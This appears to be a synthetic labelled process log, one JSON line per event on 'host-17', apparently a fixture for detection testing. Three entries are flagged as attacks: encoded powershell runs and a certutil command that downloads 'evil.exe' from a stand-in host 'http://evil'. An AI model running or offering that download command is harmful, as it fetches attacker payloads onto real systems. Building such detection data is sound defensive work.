+{"@timestamp": "2025-06-05T21:42:22.824526", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:18:49.988719", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:15:49.224551", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T06:25:01.841756", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:39:22.181064", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:27:30.005787", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:31:38.023234", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:31:40.798776", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:28:23.832217", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T13:20:32.502594", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:21:04.945084", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:42:55.739104", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:56:15.992456", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:18:00.374165", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:06:47.340095", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:29:23.367563", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T06:58:50.904836", "host": "host-17", "process": "powershell.exe", "args": "-enc <base64>", "attack": true}
+{"@timestamp": "2025-06-05T09:08:55.676150", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T06:06:10.258290", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:29:07.224947", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:13:27.577216", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:59:03.373726", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:49:58.546575", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:19:56.944348", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:35:08.358666", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:39:01.828811", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:44:11.253811", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:31:03.000715", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T17:31:41.730628", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T20:28:10.040186", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:07:11.387892", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:22:36.853442", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:25:18.613214", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:50:06.137722", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:25:32.563206", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:35:09.312777", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:08:02.752579", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T21:14:59.305594", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:19:06.254829", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:30:58.679689", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:09:01.859602", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-06T06:11:22.542436", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:09:00.904977", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:45:55.824284", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:19:17.156913", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:37:50.056293", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-06T00:49:49.655698", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:04:39.423031", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:24:56.320239", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:41:09.918355", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:39:21.639441", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:19:44.665774", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T06:37:54.576681", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-06T04:58:12.458444", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:08:08.465690", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:29:31.176038", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:06:03.573211", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:23:42.785767", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:08:37.825733", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:47:54.453459", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:47:12.045274", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:39:35.039879", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:06:54.141215", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:41:02.519502", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:05:10.331649", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:49:44.956116", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:01:10.502418", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:13:37.845020", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:40:13.917887", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:09:42.356304", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T06:01:58.017305", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:03:56.151846", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:24:01.046606", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T09:27:49.985007", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:00:32.962465", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:09:03.005718", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:36:11.238696", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:51:07.843647", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:57:00.023197", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:55:44.965179", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:19:23.398992", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:21:08.951851", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T19:32:57.123321", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:04:06.295922", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-06T03:01:24.151968", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:59:56.769967", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:11:50.004821", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:18:17.377724", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:20:52.709160", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:41:35.889464", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:54:44.863345", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:21:52.007329", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:20:48.313764", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:59:22.112348", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:28:01.870187", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:53:36.495009", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:25:25.584797", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:43:22.303850", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:35:43.750516", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:15:38.076643", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T23:46:09.352171", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:37:13.630926", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:08:40.712062", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:33:59.452390", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:05:39.809128", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:54:18.106164", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:59:49.734169", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:10:21.586004", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-06T01:14:46.004097", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:03:24.004410", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:30:59.767614", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:15:58.940681", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T22:18:24.886927", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:39:01.276752", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:03:41.714534", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T09:34:19.589412", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:37:52.322521", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:20:33.469899", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:02:00.011218", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:57:08.827531", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:14:10.745082", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:15:48.754298", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:35:44.088255", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:24:46.468337", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:30:25.896530", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:33:42.532061", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:04:32.800944", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:55:18.557212", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T18:33:33.374737", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:12:49.735660", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:30:19.297521", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:03:47.907177", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:50:42.807599", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:22:31.471284", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:41:57.302111", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:33:14.783358", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:46:41.090929", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:35:16.220250", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:57:52.629451", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:53:08.410196", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:24:11.588077", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:57:18.994660", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:48:16.265095", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:21:02.547901", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:59:20.253378", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:54:48.487020", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T06:27:34.778651", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T06:38:40.039544", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:12:33.450233", "host": "host-17", "process": "powershell.exe", "args": "-enc <base64>", "attack": true}
+{"@timestamp": "2025-06-05T10:01:45.224124", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:20:55.445735", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:24:52.075325", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:28:55.017073", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:44:54.690285", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:28:08.174010", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:52:49.716684", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:14:24.461231", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:54:35.356550", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:27:50.324944", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:37:53.767760", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:28:11.569558", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:46:34.096286", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T17:51:33.995792", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T16:15:44.947019", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:34:52.771533", "host": "host-17", "process": "certutil.exe", "args": "-urlcache -split -f http://evil/evil.exe", "attack": true}
+{"@timestamp": "2025-06-05T20:19:11.813387", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:35:00.741255", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T11:24:06.805947", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:58:43.907525", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T18:07:47.464667", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:24:25.329535", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:45:04.335463", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:55:11.300669", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:25:44.329125", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:35:35.411075", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:06:23.012055", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:06:49.260988", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T19:47:13.627002", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:08:47.071436", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:21:42.998912", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:46:48.906791", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T06:10:52.486775", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T15:22:07.238128", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:30:55.955559", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:05:26.802663", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:05:48.500732", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:27:47.835117", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:04:43.663991", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:04:10.262768", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:18:34.845353", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:50:55.777775", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T06:09:55.626669", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:27:15.297843", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:10:59.980953", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T10:51:28.015864", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T10:51:47.625548", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T18:28:49.057067", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:19:09.051198", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T12:39:35.214548", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:22:26.876978", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:43:27.801267", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T09:00:28.412190", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:09:11.080393", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:05:16.032436", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:04:32.815904", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-06T01:54:08.993277", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T20:51:08.110851", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:23:12.225088", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T04:48:05.530248", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T22:43:14.189772", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:52:34.357415", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:41:36.881934", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T07:37:28.057032", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T19:29:23.461829", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T06:16:47.683160", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T15:02:59.819027", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:11:46.134935", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:55:28.231233", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:09:18.541859", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:08:10.567265", "host": "host-17", "process": "powershell.exe", "args": "-nop -w hidden", "attack": false}
+{"@timestamp": "2025-06-05T20:45:28.320367", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:10:26.333626", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T03:47:04.743700", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:47:38.132889", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:41:19.935081", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:41:16.349020", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-06T04:17:07.381460", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:59:32.204694", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:16:42.571263", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T17:58:32.307858", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:17:37.317762", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:46:15.696326", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T08:32:14.124154", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:48:09.682698", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T05:21:54.046143", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:24:35.459298", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:33:45.691783", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T00:02:13.559260", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:12:32.821272", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T13:31:30.552261", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:30:09.772686", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:53:28.367964", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:26:19.631704", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T09:36:49.638722", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T14:09:01.745545", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T01:47:43.040560", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:42:31.918198", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-06T01:29:17.726265", "host": "host-17", "process": "notepad.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T16:04:59.207125", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T15:13:56.253820", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-06T04:33:22.706006", "host": "host-17", "process": "calc.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T21:18:02.251907", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T10:11:58.938693", "host": "host-17", "process": "certutil.exe", "args": "-decode localfile.txt", "attack": false}
+{"@timestamp": "2025-06-05T11:59:38.946557", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-06T02:12:33.593655", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:41:19.843240", "host": "host-17", "process": "explorer.exe", "args": "", "attack": false}
+{"@timestamp": "2025-06-05T11:08:56.226720", "host": "host-17", "process": "mspaint.exe", "args": "", "attack": false}
